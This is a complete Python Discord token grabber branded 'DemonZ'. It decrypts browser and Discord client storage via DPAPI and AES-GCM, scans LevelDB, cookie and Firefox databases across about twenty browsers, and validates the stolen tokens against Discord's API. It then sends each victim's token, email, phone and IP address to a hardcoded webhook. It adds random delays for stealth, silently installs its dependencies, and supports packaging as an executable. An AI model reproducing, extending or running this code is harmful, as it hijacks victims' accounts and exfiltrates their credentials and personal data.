# Discord token grabber with robust browser and Discord app support
# 7-29-25
# Author: Itzzkirito
# Brand: DemonZ

import os
import sys
import re
import json
import base64
import urllib.request
import datetime
import subprocess
import argparse
import random
from threading import Thread, Lock
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
import sqlite3
from Crypto.Cipher import AES
import win32crypt
import time

logging.basicConfig(format='%(levelname)s:%(message)s', level=logging.INFO)
Logger = logging.getLogger("DemonZ")

# Constants
TOKEN_PATTERN = r"[\w-]{24,27}\.[\w-]{6,7}\.[\w-]{25,110}"
CHROMIUM_BROWSERS = ["Brave", "Chrome", "Edge", "Opera", "Vivaldi", "Yandex", 
                     "Amigo", "Torch", "Kometa", "Orbitum", "CentBrowser", 
                     "7Star", "Sputnik", "Epic Privacy Browser", "Uran", "Iridium"]
REQUEST_TIMEOUT = 10

# Global configuration (loaded from config.json)
CONFIG = {}
# Encryption key cache
_key_cache = {}

def install_import(modules):
    for module, pip_name in modules:
        try:
            __import__(module)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pip_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            os.execl(sys.executable, sys.executable, *sys.argv)

install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher.AES", "pycryptodome"), ("sqlite3", "sqlite3")])

# Default configuration
DEFAULT_CONFIG = {
    "webhook_urls": ["https://discord.com/api/webhooks/1542089964001431562/SKhjAbd7q1A3BC5418kaCK_9hFg59pygTcnVfuqZpSCi56wNKmdE6lkH1DUHP0MrT-LR"],
    "avatar_url": "https://i.imgur.com/example.png",
    "embed_color": 1752220,
    "timeout": 10,
    "silent_mode": False,
    "dry_run": False,
    "save_to_file": True,
    "backup_file": "tokens_backup.txt",
    "max_threads": 20,
    "random_delays": True,
    "min_delay": 0.01,
    "max_delay": 0.05,
    "webhook_retry_count": 3,
    "webhook_retry_delay": 2.0
}  

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")

PATHS = {
    'Discord': ROAMING + '\\discord',
    'Discord Canary': ROAMING + '\\discordcanary',
    'Discord PTB': ROAMING + '\\discordptb',
    'Lightcord': ROAMING + '\\Lightcord',
    'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data',
    'Chrome': LOCAL + '\\Google\\Chrome\\User Data',
    'Chrome SxS': LOCAL + '\\Google\\Chrome SxS\\User Data',
    'Edge': LOCAL + '\\Microsoft\\Edge\\User Data',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable',
    'Vivaldi': LOCAL + '\\Vivaldi\\User Data',
    'Yandex': LOCAL + '\\Yandex\\YandexBrowser\\User Data',
    'Amigo': LOCAL + '\\Amigo\\User Data',
    'Torch': LOCAL + '\\Torch\\User Data',
    'Kometa': LOCAL + '\\Kometa\\User Data',
    'Orbitum': LOCAL + '\\Orbitum\\User Data',
    'CentBrowser': LOCAL + '\\CentBrowser\\User Data',
    '7Star': LOCAL + '\\7Star\\7Star\\User Data',
    'Sputnik': LOCAL + '\\Sputnik\\Sputnik\\User Data',
    'Epic Privacy Browser': LOCAL + '\\Epic Privacy Browser\\User Data',
    'Uran': LOCAL + '\\uCozMedia\\Uran\\User Data',
    'Iridium': LOCAL + '\\Iridium\\User Data',
    'Firefox': ROAMING + '\\Mozilla\\Firefox\\Profiles'
}

def load_config(config_path="config.json"):
    """Load configuration from JSON file with defaults."""
    global CONFIG
    CONFIG = DEFAULT_CONFIG.copy()
    
    # Handle PyInstaller bundled config
    if getattr(sys, 'frozen', False):
        # Running as compiled executable
        bundle_dir = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
        config_path = os.path.join(bundle_dir, os.path.basename(config_path))
        Logger.info(f"Running as EXE, looking for config at: {config_path}")
    
    if os.path.exists(config_path):
        try:
            with open(config_path, 'r') as f:
                user_config = json.load(f)
                CONFIG.update(user_config)
            Logger.info(f"Loaded configuration from {config_path}")
        except Exception as e:
            Logger.warning(f"Failed to load config from {config_path}: {e}, using defaults")
    else:
        Logger.info("No config file found, using default configuration")
    
    return CONFIG

def get_encryption_key(path):
    """Get encryption key with caching."""
    if path in _key_cache:
        return _key_cache[path]
    
    local_state_path = os.path.join(path, "Local State")
    if not os.path.exists(local_state_path):
        Logger.info(f"No Local State file at {local_state_path}")
        return None
    try:
        with open(local_state_path, "r", encoding='utf-8') as f:
            local_state = json.load(f)
        encrypted_key_b64 = local_state.get("os_crypt", {}).get("encrypted_key")
        if not encrypted_key_b64:
            Logger.info(f"No encrypted_key in Local State at {local_state_path}")
            return None
        encrypted_key = base64.b64decode(encrypted_key_b64)[5:]
        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        Logger.info(f"Successfully retrieved encryption key at {path}")
        _key_cache[path] = key
        return key
    except (FileNotFoundError, json.JSONDecodeError, KeyError) as e:
        Logger.error(f"Failed to get encryption key at {path}: {e}")
        return None
    except Exception as e:
        Logger.error(f"Unexpected error getting encryption key at {path}: {e}")
        return None

def decrypt_token(encrypted_token, key):
    try:
        encrypted_token = base64.b64decode(encrypted_token.split("dQw4w9WgXcQ:")[1])
        iv = encrypted_token[3:15]
        ciphertext = encrypted_token[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt_and_verify(ciphertext[:-16], ciphertext[-16:])
        return decrypted.decode(errors="ignore").strip()
    except (IndexError, ValueError, base64.binascii.Error) as e:
        Logger.error(f"Decryption failed - invalid token format: {e}")
        return None
    except Exception as e:
        Logger.error(f"Decryption failed: {e}")
        return None

def find_leveldb_paths(root_path):
    """Helper function to find all leveldb directories under a given path."""
    leveldb_paths = []
    try:
        for root, dirs, _ in os.walk(root_path):
            if "leveldb" in dirs:
                leveldb_paths.append(os.path.join(root, "leveldb"))
    except (PermissionError, OSError) as e:
        Logger.error(f"Error walking directory {root_path}: {e}")
    return leveldb_paths

def safe_storage_steal(path, platform):
    tokens = []
    key = get_encryption_key(os.path.dirname(path) if any(x in platform for x in CHROMIUM_BROWSERS) else path)
    if not key and any(x in platform for x in CHROMIUM_BROWSERS):
        Logger.info(f"No encryption key for {platform} at {path}")
        return tokens
    leveldb_paths = find_leveldb_paths(path)
    if not leveldb_paths:
        Logger.info(f"No LevelDB found at {path}")
        return tokens
    for leveldb_path in leveldb_paths:
        Logger.info(f"Scanning LevelDB at {leveldb_path}")
        try:
            for file_name in os.listdir(leveldb_path):
                if not file_name.endswith((".log", ".ldb")):
                    continue
                file_path = os.path.join(leveldb_path, file_name)
                Logger.info(f"Checking file: {file_path}")
                
                # Random delay for stealth
                if CONFIG.get("random_delays", True):
                    time.sleep(random.uniform(CONFIG.get("min_delay", 0.01), CONFIG.get("max_delay", 0.05)))
                
                with open(file_path, errors="ignore") as f:
                    for line in f:
                        if line.strip():
                            matches = re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line)
                            for match in matches:
                                match = match.rstrip("\\")
                                decrypted = decrypt_token(match, key) if key else None
                                if decrypted and (decrypted, platform) not in tokens:
                                    Logger.info(f"Found decrypted token in {platform}: {file_path}")
                                    tokens.append((decrypted, platform))
        except Exception as e:
            Logger.error(f"Failed to read tokens from {leveldb_path}: {e}")
    return tokens

def simple_steal(path, platform):
    tokens = []
    leveldb_paths = find_leveldb_paths(path)
    if not leveldb_paths:
        Logger.info(f"No LevelDB found at {path}")
        return tokens
    for leveldb_path in leveldb_paths:
        Logger.info(f"Scanning LevelDB for unencrypted tokens at {leveldb_path}")
        try:
            for file_name in os.listdir(leveldb_path):
                if not file_name.endswith((".log", ".ldb")):
                    continue
                file_path = os.path.join(leveldb_path, file_name)
                Logger.info(f"Checking file: {file_path}")
                with open(file_path, errors="ignore") as f:
                    for line in f:
                        if line.strip():
                            matches = re.findall(TOKEN_PATTERN, line)
                        for match in matches:
                            match = match.rstrip("\\").strip()
                            if (match, platform) not in tokens:
                                Logger.info(f"Found unencrypted token in {platform}: {file_path}")
                                tokens.append((match, platform))
        except (PermissionError, OSError) as e:
            Logger.error(f"Permission/OS error reading from {leveldb_path}: {e}")
        except Exception as e:
            Logger.error(f"Failed to read unencrypted tokens from {leveldb_path}: {e}")
    return tokens

def firefox_steal(path, platform):
    tokens = []
    sqlite_paths = []
    for root, _, files in os.walk(path):
        for file in files:
            if file.lower().endswith(".sqlite"):
                sqlite_paths.append(os.path.join(root, file))
    if not sqlite_paths:
        Logger.info(f"No SQLite databases found at {path}")
        return tokens
    for sqlite_path in sqlite_paths:
        Logger.info(f"Scanning SQLite database at {sqlite_path}")
        try:
            with open(sqlite_path, errors="ignore") as f:
                for line in f:
                    if line.strip():
                        matches = re.findall(TOKEN_PATTERN, line)
                        for match in matches:
                            match = match.rstrip("\\").strip()
                            if (match, platform) not in tokens:
                                Logger.info(f"Found token in {platform} SQLite: {sqlite_path}")
                                tokens.append((match, platform))
        except Exception as e:
            Logger.error(f"Failed to read tokens from {sqlite_path}: {e}")
    return tokens

def steal_cookies(path, platform):
    tokens = []
    cookie_path = os.path.join(path, "Network", "Cookies")
    if not os.path.exists(cookie_path):
        Logger.info(f"No Cookies database at {cookie_path}")
        return tokens
    try:
        if not os.access(cookie_path, os.R_OK):
            Logger.error(f"No read permission for Cookies database at {cookie_path}")
            return tokens
        with open(cookie_path, 'rb') as f:
            pass  # Test file access
        conn = sqlite3.connect(f"file:{cookie_path}?mode=ro", uri=True)
        conn.text_factory = bytes
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT encrypted_value FROM cookies WHERE host_key LIKE '%discord%' AND name = 'token'")
            key = get_encryption_key(os.path.dirname(path))
            for row in cursor.fetchall():
                encrypted_value = row[0]
                try:
                    decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
                    decrypted = decrypted.strip()
                    if decrypted and re.match(TOKEN_PATTERN, decrypted) and (decrypted, platform) not in tokens:
                        Logger.info(f"Found token in cookies at {cookie_path}")
                        tokens.append((decrypted, platform))
                except Exception as e:
                    Logger.error(f"Failed to decrypt cookie at {cookie_path}: {e}")
        finally:
            conn.close()
    except sqlite3.Error as e:
        Logger.error(f"SQLite error accessing Cookies database at {cookie_path}: {e}")
    except (PermissionError, OSError) as e:
        Logger.error(f"Permission/OS error accessing Cookies database at {cookie_path}: {e}")
    except Exception as e:
        Logger.error(f"Failed to access Cookies database at {cookie_path}: {e}")
    return tokens

def get_tokens(platform, path):
    tokens = []
    Logger.info(f"Scanning {platform} at {path}")
    if not os.path.exists(path):
        Logger.info(f"Path does not exist: {path}")
        return tokens
    if "Firefox" in platform:
        tokens.extend(firefox_steal(path, platform) or [])
    else:
        if any(x in platform for x in CHROMIUM_BROWSERS):
            profiles = ['Default'] + [f"Profile {i}" for i in range(1, 10)]
            for profile in profiles:
                profile_path = os.path.join(path, profile)
                if os.path.exists(profile_path):
                    Logger.info(f"Found profile: {profile_path}")
                    tokens.extend(safe_storage_steal(profile_path, f"{platform} ({profile})") or [])
                    tokens.extend(simple_steal(profile_path, f"{platform} ({profile})") or [])
                    tokens.extend(steal_cookies(profile_path, f"{platform} ({profile})") or [])
        else:
            tokens.extend(safe_storage_steal(path, platform) or [])
            tokens.extend(simple_steal(path, platform) or [])
    return tokens

def get_headers(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36"
    }
    if token:
        headers["Authorization"] = token
    return headers

def get_ip():
    try:
        with urllib.request.urlopen("https://api.ipify.org?format=json", timeout=REQUEST_TIMEOUT) as response:
            return json.loads(response.read().decode()).get("ip")
    except urllib.error.URLError as e:
        Logger.error(f"Network error getting IP: {e}")
        return "Unavailable"
    except Exception as e:
        Logger.error(f"Failed to get IP: {e}")
        return "Unavailable"

def save_to_backup_file(token, user_data, platform, ip):
    """Save token info to backup file."""
    if not CONFIG.get("save_to_file", True):
        return
    
    try:
        backup_file = CONFIG.get("backup_file", "tokens_backup.txt")
        with open(backup_file, "a", encoding="utf-8") as f:
            timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            f.write(f"[{timestamp}] {platform}\n")
            f.write(f"Token: {token}\n")
            f.write(f"User: {user_data.get('username', 'Unknown')}#{user_data.get('discriminator', '0')}\n")
            f.write(f"Email: {user_data.get('email', 'N/A')}\n")
            f.write(f"IP: {ip}\n")
            f.write("-" * 80 + "\n")
        Logger.info(f"Token saved to backup file: {backup_file}")
    except Exception as e:
        Logger.error(f"Failed to save to backup file: {e}")

def send_to_webhook(embed):
    """Send to webhook with fallback support and retry logic."""
    # Dry run mode
    if CONFIG.get("dry_run", False):
        Logger.info("[DRY RUN] Would send to webhook:")
        Logger.info(json.dumps(embed, indent=2))
        return True
    
    webhook_urls = CONFIG.get("webhook_urls", [""])
    if not webhook_urls or not webhook_urls[0]:
        webhook_urls = [""]
    
    retry_count = CONFIG.get("webhook_retry_count", 3)
    retry_delay = CONFIG.get("webhook_retry_delay", 2.0)
    
    for webhook_url in webhook_urls:
        if not webhook_url:
            continue
            
        for attempt in range(retry_count):
            try:
                data = json.dumps(embed, ensure_ascii=False).encode('utf-8')
                req = urllib.request.Request(webhook_url, data=data, headers=get_headers(), method="POST")
                timeout = CONFIG.get("timeout", REQUEST_TIMEOUT)
                with urllib.request.urlopen(req, timeout=timeout) as response:
                    Logger.info(f"Webhook sent successfully to {webhook_url}, status: {response.status}")
                    return True
            except urllib.error.HTTPError as e:
                Logger.error(f"HTTP Error {e.code}: {e.reason} (Attempt {attempt+1}/{retry_count})")
                try:
                    error_response = e.read().decode()
                    Logger.error(f"Webhook error response: {error_response}")
                except Exception:
                    Logger.error("Could not read webhook error response")
            except urllib.error.URLError as e:
                Logger.error(f"Network error: {e} (Attempt {attempt+1}/{retry_count})")
            except Exception as e:
                Logger.error(f"Error sending webhook: {e} (Attempt {attempt+1}/{retry_count})")
            
            if attempt < retry_count - 1:
                Logger.info(f"Retrying in {retry_delay}s...")
                time.sleep(retry_delay)
    
    Logger.error("All webhook attempts failed")
    Logger.info(f"Failed payload: {json.dumps(embed, indent=2)}")
    return False

def send_token_info(token, user_data, platform, ip):
    """Send token information to webhook and/or backup file."""
    try:
        Logger.info(f"User data for {platform}: {json.dumps(user_data, indent=2)}")
        username = user_data.get('username', 'Unknown')
        discriminator = user_data.get('discriminator', '0')
        if not username or not isinstance(username, str):
            username = "Unknown"
        if not discriminator or not isinstance(discriminator, str):
            discriminator = "0"
        badges = ""
        flags = user_data.get('flags', 0)
        if flags & 64: badges += ":BadgeBravery: "
        if flags & 128: badges += ":BadgeBrilliance: "
        if flags & 256: badges += ":BadgeBalance: "

        embed = {
            "username": "DemonZ",
            "avatar_url": CONFIG.get("avatar_url", "https://i.imgur.com/example.png"),
            "embeds": [
                {
                    "title": f"New Discord Token Found: {username}#{discriminator} ({platform})",
                    "color": CONFIG.get("embed_color", 1752220),
                    "thumbnail": {
                        "url": f"https://cdn.discordapp.com/avatars/{user_data.get('id', '0')}/{user_data.get('avatar', '')}.png" if user_data.get('avatar') else ""
                    },
                    "fields": [
                        {"name": "User ID", "value": user_data.get('id', 'N/A'), "inline": True},
                        {"name": "Email", "value": user_data.get('email', 'N/A'), "inline": True},
                        {"name": "Phone", "value": str(user_data.get('phone', 'N/A')), "inline": True},
                        {"name": "Flags", "value": str(flags), "inline": True},
                        {"name": "Badges", "value": badges or "None", "inline": True},
                        {"name": "Platform", "value": platform, "inline": True},
                        {"name": "IP Address", "value": ip, "inline": True},
                        {"name": "Token", "value": f"```{token}```", "inline": False}
                    ],
                    "footer": {
                        "text": f"Sent at {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} • Developed by DemonZ"
                    }
                }
            ]
        }
        
        # Save to backup file
        # save_to_backup_file(token, user_data, platform, ip)
        
        # Send to webhook
        success = send_to_webhook(embed)
        if not success:
            Logger.warning(f"Webhook failed for {platform}, but data saved to backup file")
    except Exception as e:
        Logger.error(f"Failed to build webhook payload for {platform}: {e}")

def validate_config():
    """Validate configuration before running."""
    errors = []
    warnings = []
    
    # Check webhook URLs
    webhook_urls = CONFIG.get("webhook_urls", [])
    if not webhook_urls or not any(webhook_urls):
        if not CONFIG.get("dry_run", False):
            errors.append("No webhook URLs configured and not in dry-run mode")
    else:
        for url in webhook_urls:
            if url and not url.startswith(('http://', 'https://')):
                errors.append(f"Webhook URL must start with http:// or https://: {url}")
            elif url and 'discord' not in url.lower():
                warnings.append(f"Webhook URL does not appear to be a Discord webhook: {url}")
    
    # Check environment variables
    if not LOCAL:
        errors.append("LOCALAPPDATA environment variable not found")
    if not ROAMING:
        errors.append("APPDATA environment variable not found")
    
    # Display warnings
    for warning in warnings:
        Logger.warning(f"Configuration warning: {warning}")
    
    # Return validation results
    if errors:
        for error in errors:
            Logger.error(f"Configuration error: {error}")
        return False
    
    Logger.info("Configuration validation passed")
    return True

def validate_token_parallel(token, platform, ip):
    """Validate a single token (for parallel execution)."""
    try:
        timeout = CONFIG.get("timeout", REQUEST_TIMEOUT)
        req = urllib.request.Request("https://discord.com/api/v9/users/@me", headers=get_headers(token))
        with urllib.request.urlopen(req, timeout=timeout) as response:
            if response.status == 200:
                user_data = json.loads(response.read().decode())
                Logger.info(f"Valid token found for user: {user_data.get('username', 'Unknown')}#{user_data.get('discriminator', '0')} on {platform}")
                return (token, platform, user_data)
            else:
                Logger.error(f"Token validation failed on {platform} with status {response.status}")
                return None
    except urllib.error.HTTPError as e:
        Logger.error(f"HTTP error validating token on {platform}: {e.code} - {e.reason}")
    except urllib.error.URLError as e:
        Logger.error(f"Network error validating token on {platform}: {e}")
    except Exception as e:
        Logger.error(f"Failed to validate token on {platform}: {e}")
    return None

def main():
    # Parse CLI arguments
    parser = argparse.ArgumentParser(description='DemonZ Token Grabber - Professional Edition')
    parser.add_argument('--config', default='config.json', help='Path to config file (default: config.json)')
    parser.add_argument('--dry-run', action='store_true', help='Run without sending to webhooks')
    parser.add_argument('--silent', action='store_true', help='Silent mode - minimal logging')
    args = parser.parse_args()
    
    # Load configuration
    load_config(args.config)
    
    # Override config with CLI args
    if args.dry_run:
        CONFIG['dry_run'] = True
    if args.silent:
        CONFIG['silent_mode'] = True
        logging.disable(logging.WARNING)
    
    # Validate configuration
    if not validate_config():
        Logger.error("Configuration validation failed! Please fix the errors above.")
        sys.exit(1)
    
    Logger.info("Starting DemonZ Token Grabber - Professional Edition")
    if CONFIG.get('dry_run'):
        Logger.info("[DRY RUN MODE] No data will be sent to webhooks")
    
    start_time = time.time()
    ip = get_ip()
    Logger.info(f"IP Address: {ip}")
    found_tokens = []
    tokens_lock = Lock()
    threads = []

    def scan_platform(p, pt):
        results = get_tokens(p, pt)
        with tokens_lock:
            found_tokens.extend(results)

    for platform, path in PATHS.items():
        t = Thread(target=scan_platform, args=(platform, path))
        t.start()
        threads.append(t)

    for thread in threads:
        thread.join()

    if not found_tokens:
        Logger.info("No tokens found on this machine")
        return

    # Deduplicate tokens using set (O(1) lookup)
    seen_tokens = set()
    unique_found = []
    for token, platform in found_tokens:
        if not re.match(TOKEN_PATTERN, token):
            Logger.info(f"Skipping invalid token format from {platform}: {token}")
            continue
        if token not in seen_tokens:
            seen_tokens.add(token)
            unique_found.append((token, platform))
    
    Logger.info(f"Found {len(unique_found)} unique tokens to validate")
    
    # Parallel token validation
    valid_tokens = []
    max_workers = min(CONFIG.get("max_threads", 20), len(unique_found))
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(validate_token_parallel, token, platform, ip): (token, platform) 
                   for token, platform in unique_found}
        
        for future in as_completed(futures):
            result = future.result()
            if result:
                token, platform, user_data = result
                valid_tokens.append((token, platform, user_data))
                send_token_info(token, user_data, platform, ip)
    
    elapsed = time.time() - start_time
    if valid_tokens:
        Logger.info(f"Successfully processed {len(valid_tokens)} valid tokens in {elapsed:.2f}s")
    else:
        Logger.info("No valid tokens found")
    
    Logger.info("DemonZ Token Grabber completed successfully")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        Logger.critical(f"Fatal error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        if not CONFIG.get('silent_mode') and sys.stdin and sys.stdin.isatty():
            try:
                input("\nPress Enter to exit...")
            except (EOFError, OSError):
                pass
